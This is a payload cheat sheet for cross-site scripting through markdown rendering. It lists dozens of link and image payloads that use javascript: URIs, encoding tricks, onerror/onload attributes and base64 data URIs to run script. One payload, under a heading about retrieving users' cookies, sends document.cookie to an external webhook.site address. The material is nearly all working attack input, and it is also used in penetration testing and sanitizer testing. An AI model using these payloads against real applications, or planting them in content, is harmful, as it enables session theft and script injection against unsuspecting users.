## XSS via Markdown Payloads 

#### Hyperlink to XSS

```bash
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](http://a?p=[[/onclick=alert(0) .]])
[a](javascript:new%20Function`al\ert\`1\``;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
![a](https://lnkd.in/d-5FWcWe"onload="alert(1))
[a]("onerror="alert(1))
</http://<?php\><\h1\><script:script>confirm(2)
[XSS](.alert(1);)
```

#### Image to XSS

```bash
![XSS](x"onerror="alert(1)")
![XSS](x"onload="alert(1)")
![XSS](<"onerror="alert('XSS')>)
![XSS](<https://www.example.com/image.png"onerror="alert('XSS')>)
![a](data:image/svg+xml,<svg/onload=alert(1)>)
![a](data:image/svg+xml,<svg/onload="alert(1)">)
![a](data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
![a](data:image/svg+xml,<svg><script>alert(1)</script></svg>)
![a](javascript&#x3A;alert(1))
![a](javascript:alert`1`)
```

#### To Retrive user's Cookies on your Server

```bash
[XSS](javascript:window.onerror=window.location='https://webhook.site/09731cdb-80b0-47e8-a057-f86e939f1ad9?'+document.cookie)
```

#### Supporting Material:-
- https://huntr.dev/bounties/b2caceaa-5b28-40ba-9980-70144159efba/
- https://amjadali110.medium.com/hyperlink-injection-726d8151b216
